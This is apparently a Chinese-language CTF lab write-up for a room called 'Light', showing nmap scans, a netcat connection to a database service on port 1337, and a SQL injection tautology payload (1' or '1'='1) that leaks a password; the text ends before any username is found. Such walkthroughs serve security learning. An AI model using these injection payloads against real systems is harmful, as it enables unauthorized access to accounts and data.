---
icon: pen-to-square
date: 2025-05-27
tags: 
title: Light
category:
  - 项目
---
## 信息收集
**先用namp扫一下看看**

```bash
root@ip-10-10-232-200:~# sudo nmap -sT --min-rate 10000 -p- 10.10.167.14 
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-27 13:53 BST
Nmap scan report for 10.10.167.14
Host is up (0.0049s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
1337/tcp open  waste
MAC Address: 02:FB:FD:95:CD:1D (Unknown)
```
存在两个端口
继续扫描
```bash
root@ip-10-10-232-200:~# sudo nmap -sT -sV -sC -O -p22,1337 10.10.167.14
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-27 13:56 BST
Nmap scan report for 10.10.167.14
Host is up (0.00054s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
1337/tcp open  waste?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|     Welcome to the Light database!
|     Please enter your username:
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, RTSPRequest: 
|     Welcome to the Light database!
|     Please enter your username: Username not found.
|_    Please enter your username:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.80%I=7%D=5/27%Time=6835B676%P=x86_64-pc-linux-gnu%r(NU
SF:LL,3B,"Welcome\x20to\x20the\x20Light\x20database!\nPlease\x20enter\x20y
SF:our\x20username:\x20")%r(GenericLines,6B,"Welcome\x20to\x20the\x20Light
SF:\x20database!\nPlease\x20enter\x20your\x20username:\x20Username\x20not\
SF:x20found\.\nPlease\x20enter\x20your\x20username:\x20")%r(GetRequest,6B,
SF:"Welcome\x20to\x20the\x20Light\x20database!\nPlease\x20enter\x20your\x2
SF:0username:\x20Username\x20not\x20found\.\nPlease\x20enter\x20your\x20us
SF:ername:\x20")%r(HTTPOptions,6B,"Welcome\x20to\x20the\x20Light\x20databa
SF:se!\nPlease\x20enter\x20your\x20username:\x20Username\x20not\x20found\.
SF:\nPlease\x20enter\x20your\x20username:\x20")%r(RTSPRequest,6B,"Welcome\
SF:x20to\x20the\x20Light\x20database!\nPlease\x20enter\x20your\x20username
SF::\x20Username\x20not\x20found\.\nPlease\x20enter\x20your\x20username:\x
SF:20")%r(RPCCheck,3B,"Welcome\x20to\x20the\x20Light\x20database!\nPlease\
SF:x20enter\x20your\x20username:\x20")%r(DNSVersionBindReqTCP,3B,"Welcome\
SF:x20to\x20the\x20Light\x20database!\nPlease\x20enter\x20your\x20username
SF::\x20")%r(DNSStatusRequestTCP,3B,"Welcome\x20to\x20the\x20Light\x20data
SF:base!\nPlease\x20enter\x20your\x20username:\x20")%r(Help,6B,"Welcome\x2
SF:0to\x20the\x20Light\x20database!\nPlease\x20enter\x20your\x20username:\
SF:x20Username\x20not\x20found\.\nPlease\x20enter\x20your\x20username:\x20
SF:")%r(SSLSessionReq,3B,"Welcome\x20to\x20the\x20Light\x20database!\nPlea
SF:se\x20enter\x20your\x20username:\x20")%r(TerminalServerCookie,3B,"Welco
SF:me\x20to\x20the\x20Light\x20database!\nPlease\x20enter\x20your\x20usern
SF:ame:\x20")%r(TLSSessionReq,3B,"Welcome\x20to\x20the\x20Light\x20databas
SF:e!\nPlease\x20enter\x20your\x20username:\x20")%r(Kerberos,3B,"Welcome\x
SF:20to\x20the\x20Light\x20database!\nPlease\x20enter\x20your\x20username:
SF:\x20")%r(SMBProgNeg,3B,"Welcome\x20to\x20the\x20Light\x20database!\nPle
SF:ase\x20enter\x20your\x20username:\x20")%r(X11Probe,3B,"Welcome\x20to\x2
SF:0the\x20Light\x20database!\nPlease\x20enter\x20your\x20username:\x20")%
SF:r(FourOhFourRequest,6B,"Welcome\x20to\x20the\x20Light\x20database!\nPle
SF:ase\x20enter\x20your\x20username:\x20Username\x20not\x20found\.\nPlease
SF:\x20enter\x20your\x20username:\x20");
MAC Address: 02:FB:FD:95:CD:1D (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 3.8 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 158.88 seconds

```
发现一些直接传输的语句，那么用nc链接一下试试
```bash
nc 10.10.167.14 1337
```
存在sql注入
```bash
Welcome to the Light database!
Please enter your username: 1'
Error: unrecognized token: "'1'' LIMIT 30"
```
那么使用万能密码试一下
```bash
Please enter your username: 1' or '1'='1
Password: tF8tj2o94WE4LKC
```
发现获得了密码，但是此时还没有用户名